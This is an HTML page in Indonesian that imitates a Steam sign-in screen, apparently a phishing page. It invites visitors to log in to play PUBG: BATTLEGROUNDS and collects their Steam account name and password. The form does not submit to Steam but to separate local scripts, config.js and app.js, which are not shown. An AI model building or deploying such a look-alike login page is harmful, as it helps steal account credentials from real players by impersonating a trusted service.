<!doctype html><html lang="id"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Steam — Masuk</title>
<link rel="stylesheet" href="style.css"></head><body>
<form class="card" id="form">
  <div class="brand">STEAM <span>POWERED</span></div>
  <h1>Masuk</h1>
  <p class="sub">Masuk untuk memainkan PUBG: BATTLEGROUNDS.</p>
  <label>Nama akun Steam</label>
  <input id="user" autocomplete="username" required autofocus>
  <label>Kata sandi</label>
  <input id="pw" type="password" autocomplete="current-password" required>
  <button id="btn" type="submit">Masuk</button>
</form>
<script src="config.js"></script><script src="app.js"></script>
</body></html>
